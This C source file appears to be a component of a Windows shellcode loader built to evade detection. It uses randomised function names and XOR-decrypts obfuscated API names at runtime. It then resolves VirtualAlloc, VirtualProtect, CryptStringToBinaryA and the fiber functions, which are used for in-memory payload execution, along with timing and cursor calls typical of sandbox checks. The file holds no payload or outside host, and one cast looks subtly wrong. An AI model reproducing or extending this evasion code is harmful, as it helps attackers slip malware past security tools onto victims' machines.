#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>
#include "definitons.h"

#pragma comment (lib, "User32.lib")
#pragma once

/// XOR two strings
void LCzOatFaVf71(unsigned char * payload, unsigned int payload_len, const char * xor_key, unsigned int xor_key_len){
    int j;
    j = 0;
    for (int i = 0; i < payload_len; i++) {
        if (j == xor_key_len) j = 0;
        payload[i] = payload[i] ^ xor_key[j];
        j++;
    }
}


/// Decrypt function names
void boUpJkYnxh29(unsigned char * enc_func_name){
    unsigned int enc_len = (int)strlen((const char *)enc_func_name);
    LCzOatFaVf71(enc_func_name, enc_len, XOR_FUNC_KEY, xor_func_key_len);
}

/// Populate WinAPI functions
///
/// Return Values
///  0 - OK
/// -1 - Could not find kernel32.dll
/// -2 - Could not find user32.dll
/// -3 - Could not find crypt32.dll
/// -4 - Could not find GetTickCount in kernel32.dll
/// -5 - Could not find Sleep in kernel32.dll
/// -6 - Could not find OpenInputDesktop in user32.dll
/// -7 - Could not find SetThreadDesktop in user32.dll
/// -8 - Could not find GetCursorPos in user32.dll
/// -9 - Could not find CryptStringToBinaryA in crypt32.dll
/// -10 - Could not find VirtualAlloc in kernel32.dll
/// -11 - Could not find VirtualProtect in kernel32.dll
/// -12 - Could not find ConvertThreadToFiber in kernel32.dll
/// -13 - Could not find CreateFiber in kernel32.dll
/// -14 - Could not find SwitchToFiber in kernel32.dll
int __get_funcs(){
    _kernel32 = LoadLibrary((LPCWSTR)"kernel32.dll");
    if (_kernel32 == NULL){
        // fprintf(stderr, "Could not find kernel32.dll\n");
        return -1;
    }

    _user32 = LoadLibrary((LPCWSTR)"user32.dll");
    if(_user32 == NULL){
        // fprintf(stderr, "Could not find user32.dll\n");
        return -2;
    }

    _crypt32 = LoadLibrary((LPCWSTR)"crypt32.dll");
    if(_crypt32 == NULL){
        // fprintf(stderr, "Could not find crypt32.dll\n");
        return -3;
    }

    // Decrypt the XOR'd Function name and get it's address
    boUpJkYnxh29(__gettickcount);
    _GetTickCount = (__type_gettickcount)GetProcAddress(_kernel32, (LPCSTR)__gettickcount);
    if (_GetTickCount == NULL){
        // fprintf(stderr, "Could not find GetTickCount in kernel32.dll\n");
        return -4;
    }

    boUpJkYnxh29(__sleep);
    _Sleep = (__type_sleep)GetProcAddress(_kernel32, (LPCSTR)__sleep);
    if (_Sleep == NULL){
        // fprintf(stderr, "Could not find Sleep in kernel32.dll\n");
        return -5;
    }

    boUpJkYnxh29(__openinputdesktop);
    _OpenInputDesktop = (__type_openinputdesktop)GetProcAddress(_user32, (LPCSTR)__openinputdesktop);
    if (_OpenInputDesktop == NULL){
        // fprintf(stderr, "Could not find OpenInputDesktop in user32.dll\n");
        return -6;
    }

    boUpJkYnxh29(__setthreaddesktop);
    _SetThreadDesktop = (__type_setthreaddesktop)GetProcAddress(_user32, (LPCSTR)__setthreaddesktop);
    if (_SetThreadDesktop == NULL){
        // fprintf(stderr, "Could not find SetThreadDesktop in user32.dll\n");
        return -7;
    }

    boUpJkYnxh29(__getcursorpos);
    _GetCursorPos = (__type_getcursorpos)GetProcAddress(_user32, (LPCSTR)__getcursorpos);
    if (_GetCursorPos == NULL){
        // fprintf(stderr, "Could not find GetCursorPos in user32.dll\n");
        return -8;
    }

    boUpJkYnxh29(__cryptstringtobinarya);
    _CryptStringToBinaryA = (__type_cryptstringtobinarya)GetProcAddress(_crypt32, (LPCSTR)__cryptstringtobinarya);
    if (_CryptStringToBinaryA == NULL){
        // fprintf(stderr, "Could not find CryptStringToBinaryA in crypt32.dll\n");
        return -9;
    }

    boUpJkYnxh29(__virtualalloc);
    _VirtualAlloc = (__type_virtualalloc)GetProcAddress(_kernel32, (LPCSTR)__virtualalloc);
    if (_VirtualAlloc == NULL){
        // fprintf(stderr, "Could not find VirtualAlloc in kernel32.dll\n");
        return -10;
    }

    boUpJkYnxh29(__virtualprotect);
    _VirtualProtect = (__type_virtualprotect)GetProcAddress(_kernel32, (LPCSTR)__virtualprotect);
    if (_VirtualProtect == NULL){
        // fprintf(stderr, "Could not find VirtualProtect in kernel32.dll\n");
        return -11;
    }

    boUpJkYnxh29(__convertthreadtofiber);
    _ConvertThreadToFiber = (__type_convertthreadtofiber)GetProcAddress(_kernel32, (LPCSTR)__convertthreadtofiber);
    if(_ConvertThreadToFiber == NULL){
        // fprintf(stderr, "Could not find ConvertThreadToFiber in kernel32.dll\n");
        return -12;
    }

    boUpJkYnxh29(__createfiber);
    _CreateFiber = (__type_createfiber)GetProcAddress(_kernel32, (LPCSTR)__createfiber);
    if(_CreateFiber == NULL){
        // fprintf(stderr, "Could not find CreateFiber in kernel32.dll\n");
        return -13;
    }

    boUpJkYnxh29(__switchtofiber);
    _SwitchToFiber = (__type_switchtofiber)GetProcAddress(_kernel32, (LPCSTR)__switchtofiber);
    if(_SwitchToFiber == NULL){
        // fprintf(stderr, "Could not find SwitchToFiber in kernel32.dll\n");
        return -14;
    }

    return 0;
}

// Print the contents of an address in hex
// Used for debugging purposes only
//
// void print_hex(unsigned char *payload, unsigned int payload_len){
//     int i;
//    
//     printf("{");
//     for (i=0; i<payload_len; i++){
//         printf("0x%02x, ", payload[i]);
//
//     }
//     printf("}\n");
//    
// }